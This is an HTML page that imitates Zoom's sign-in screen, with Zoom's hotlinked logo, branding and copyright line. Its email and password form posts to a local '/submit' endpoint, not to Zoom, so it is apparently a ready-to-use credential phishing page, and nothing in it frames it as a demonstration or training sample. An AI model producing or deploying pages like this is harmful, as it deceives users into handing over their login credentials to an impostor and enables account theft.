<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign In - Zoom</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background-color: #f9f9f9;
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 80px auto;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            padding: 40px;
            border-radius: 8px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            width: 150px;
        }
        h2 {
            color: #2d2d2d;
            text-align: center;
            font-weight: normal;
            margin-bottom: 10px;
        }
        label {
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
            color: #555;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .button {
            width: 100%;
            padding: 12px;
            background-color: #2d8cff;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #156dcc;
        }
        .link {
            text-align: right;
            margin-top: 10px;
        }
        .link a {
            color: #2d8cff;
            text-decoration: none;
            font-size: 13px;
        }
        .link a:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #999;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://st1.zoom.us/static/6.3.15020/image/new/ZoomLogo.png" alt="Zoom">
        </div>
        <h2>Sign In</h2>
        <form action="/submit" method="POST">
            <label for="email">Email Address</label>
            <input type="email" id="email" name="email" placeholder="email@example.com" required>

            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>

            <button class="button" type="submit">Sign In</button>
        </form>
        <div class="link">
            <a href="#">Forgot Password?</a>
        </div>
        <div class="footer">
            Â© Zoom Video Communications, Inc. 2025
        </div>
    </div>
</body>
</html>
